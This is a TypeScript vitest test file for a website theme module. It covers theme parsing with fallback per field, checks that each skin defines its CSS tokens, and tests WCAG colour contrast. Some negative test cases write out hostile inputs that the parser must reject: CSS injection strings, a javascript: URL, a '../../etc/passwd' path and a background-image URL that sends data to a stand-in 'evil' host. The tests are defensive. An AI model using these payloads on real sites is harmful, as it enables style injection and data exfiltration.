import { readFileSync } from "node:fs";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import {
  DEFAULT_THEME,
  SITE_FONTS,
  SITE_SKINS,
  isSiteFont,
  isSiteSkin,
  onAccent,
  parseAccent,
  parseTheme,
} from "./theme";

describe("parseTheme", () => {
  it("round-trips a valid theme", () => {
    expect(
      parseTheme({
        skin: "glass",
        font: "serif",
        accent: "#123456",
        radius: "sharp",
        density: "roomy",
      }),
    ).toEqual({
      skin: "glass",
      font: "serif",
      accent: "#123456",
      radius: "sharp",
      density: "roomy",
    });
  });

  it("never returns null", () => {
    // Unlike block content — where an unparseable block is one gap on an
    // otherwise fine page — there is no such thing as a page with no
    // appearance. Every one of these must land on the default rather than
    // produce an unstyled page.
    for (const input of [null, undefined, "glass", 42, [], {}]) {
      expect(parseTheme(input)).toEqual(DEFAULT_THEME);
    }
  });

  it("falls back per field, not wholesale", () => {
    // A row with one good half should keep that half. Discarding both would
    // silently undo a choice the owner did make.
    expect(parseTheme({ skin: "clay", font: "nope" })).toEqual({
      ...DEFAULT_THEME,
      skin: "clay",
    });
    // An unusable colour costs the colour, not the font chosen alongside it.
    expect(parseTheme({ skin: "nope", font: "mono", accent: "red" })).toEqual({
      ...DEFAULT_THEME,
      font: "mono",
    });
  });

  it("cannot be talked into a value outside the set", () => {
    // The whole point of storing an id rather than CSS: nothing a hand-written
    // `theme` column contains can become a style we did not author.
    const hostile = {
      skin: "glass; background: url(javascript:alert(1))",
      font: "../../etc/passwd",
      accent: "#fff;background-image:url(//evil/?c=)",
      extra: "position:fixed;inset:0",
    };
    expect(parseTheme(hostile)).toEqual(DEFAULT_THEME);
    expect(Object.keys(parseTheme(hostile)).sort()).toEqual([
      "accent",
      "density",
      "font",
      "radius",
      "skin",
    ]);
  });

  it("guards agree with the sets", () => {
    for (const skin of Object.keys(SITE_SKINS)) expect(isSiteSkin(skin)).toBe(true);
    for (const font of Object.keys(SITE_FONTS)) expect(isSiteFont(font)).toBe(true);
    expect(isSiteSkin("neobrutalism")).toBe(false);
    expect(isSiteFont("Comic Sans")).toBe(false);
  });
});

/**
 * The skins live in globals.css, so these read it. That is deliberate: the risk
 * being covered is a skin shipping with a token missing or a colour pairing
 * nobody checked, and both are properties of the CSS rather than of the TS.
 */
describe("skin definitions in globals.css", () => {
  const css = readFileSync(join(process.cwd(), "src/app/globals.css"), "utf8");

  const REQUIRED = [
    "--sk-page",
    "--sk-ink",
    "--sk-muted",
    "--sk-bg",
    "--sk-border",
    "--sk-shadow",
    "--sk-radius",
    "--sk-blur",
    "--sk-accent",
  ];

  function blockFor(skin: string): string {
    const start = css.indexOf(`.site-theme[data-skin="${skin}"] {`);
    expect(start, `no block for ${skin}`).toBeGreaterThan(-1);
    return css.slice(start, css.indexOf("}", start));
  }

  it.each(Object.keys(SITE_SKINS))("%s defines every token", (skin) => {
    // A skin missing a token inherits it from whichever skin was declared above
    // it in the file, producing a hybrid nobody designed — and it looks fine in
    // whatever browser the author happened to check.
    const block = blockFor(skin);
    for (const token of REQUIRED) expect(block, `${skin} is missing ${token}`).toContain(token);
  });

  /**
   * The surface a skin's text ACTUALLY sits on, worst case.
   *
   * Three of the six have no flat `--sk-bg` to measure — `minimal` is
   * transparent, `glass` is a 10% white wash, `skeu` is a gradient — and an
   * earlier version of this test skipped exactly those, which meant it asserted
   * three skins while reporting six. Each one is pinned here instead, to the
   * darkest or lightest thing its text can land on:
   *
   *   minimal — transparent, so text is on the page itself
   *   glass   — a 10% wash over the gradient's DARK end; treat it as that
   *   skeu    — a light gradient; its bottom stop is the worse of the two
   *
   * If a skin's fill changes, this map has to change with it. That is the
   * intended cost: it is a short list, and the alternative is a test that
   * quietly stops covering half of them.
   */
  const SURFACE: Record<string, string> = {
    neo: "#fffdf7",
    minimal: "#fafaf9",
    glass: "#151a2e",
    clay: "#f4f1fd",
    maximal: "#ffffff",
    skeu: "#e7e1d5",
  };

  it("pins a measurable surface for every skin", () => {
    // Guards the map above against a skin being added without one.
    expect(Object.keys(SURFACE).sort()).toEqual(Object.keys(SITE_SKINS).sort());
  });

  it.each(Object.keys(SITE_SKINS))("%s reaches 4.5:1 for body text", (skin) => {
    const ink = hex(blockFor(skin), "--sk-ink");
    expect(ink, `${skin} has no flat --sk-ink`).not.toBeNull();
    expect(contrast(ink!, SURFACE[skin])).toBeGreaterThanOrEqual(4.5);
  });

  it.each(Object.keys(SITE_SKINS))("%s reaches 4.5:1 for muted text", (skin) => {
    // Captions, hints and @handles all use this. It is the token most likely to
    // be picked by eye and the one where "it looked fine on my monitor" does
    // the most damage.
    const muted = hex(blockFor(skin), "--sk-muted");
    expect(muted, `${skin} has no flat --sk-muted`).not.toBeNull();
    expect(contrast(muted!, SURFACE[skin])).toBeGreaterThanOrEqual(4.5);
  });

  it("every font key has a rule", () => {
    for (const font of Object.keys(SITE_FONTS)) {
      expect(css, `no rule for data-font="${font}"`).toContain(
        `.site-theme[data-font="${font}"]`,
      );
    }
  });

  it("the page backdrop is scoped to the page root", () => {
    // The editor renders six live preview tiles carrying `data-skin`. On the
    // bare class each would paint its own fixed full-viewport backdrop.
    expect(css).toContain(".site-theme-page::before");
    expect(css).not.toMatch(/^\.site-theme::before/m);
  });
});

function hex(block: string, token: string): string | null {
  const match = block.match(new RegExp(`${token}:\\s*(#[0-9a-fA-F]{6})\\b`));
  return match ? match[1] : null;
}

function luminance(value: string): number {
  const channels = [1, 3, 5].map((i) => parseInt(value.slice(i, i + 2), 16) / 255);
  const [r, g, b] = channels.map((c) =>
    c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4,
  );
  return 0.2126 * r + 0.7152 * g + 0.0722 * b;
}

function contrast(a: string, b: string): number {
  const [hi, lo] = [luminance(a), luminance(b)].sort((x, y) => y - x);
  return (hi + 0.05) / (lo + 0.05);
}

describe("parseAccent", () => {
  it("accepts and normalises #rrggbb", () => {
    expect(parseAccent("#BCA6F7")).toBe("#bca6f7");
    expect(parseAccent("  #000000 ")).toBe("#000000");
  });

  describe("rejects everything that is not six hex digits", () => {
    // Not because a colour is dangerous — because a STRING is. This value ends
    // up inside `background: var(--sk-accent)`, so anything a custom property
    // considers a valid token sequence would land in a declaration.
    it.each([
      ["a named colour", "red"],
      ["short hex", "#fff"],
      ["eight-digit hex", "#bca6f7ff"],
      ["rgb()", "rgb(1,2,3)"],
      ["a declaration terminator", "#bca6f7;color:red"],
      ["a url", "url(https://tracker.example/x)"],
      ["an exfiltrating image", "#fff;background-image:url(//evil/?c=)"],
      ["a var() indirection", "var(--sk-ink)"],
      ["an expression", "calc(1px)"],
      ["a non-string", 0x112233],
      ["null", null],
      ["undefined", undefined],
    ])("%s", (_label, input) => {
      expect(parseAccent(input)).toBeNull();
    });
  });
});

describe("onAccent", () => {
  /**
   * The guarantee behind offering a colour picker at all: for EVERY colour in
   * sRGB, the chosen foreground clears AA. Contrast to black rises as contrast
   * to white falls and they cross at 4.58:1, so the maximum of the two can
   * never dip below that — this walks the cube to show it.
   */
  it("never drops below 4.5:1, over the whole sRGB cube", () => {
    let worst = Infinity;
    let worstColour = "";

    for (let r = 0; r < 256; r += 5) {
      for (let g = 0; g < 256; g += 5) {
        for (let b = 0; b < 256; b += 5) {
          const hex = `#${[r, g, b].map((c) => c.toString(16).padStart(2, "0")).join("")}`;
          const ratio = contrast(onAccent(hex), hex);
          if (ratio < worst) {
            worst = ratio;
            worstColour = hex;
          }
        }
      }
    }

    expect(worst, `worst pairing was ${worstColour}`).toBeGreaterThanOrEqual(4.5);
  });

  it("picks black on light and white on dark", () => {
    expect(onAccent("#ffffff")).toBe("#000000");
    expect(onAccent("#000000")).toBe("#ffffff");
    expect(onAccent("#ffe27f")).toBe("#000000");
    expect(onAccent("#4c1d95")).toBe("#ffffff");
  });
});
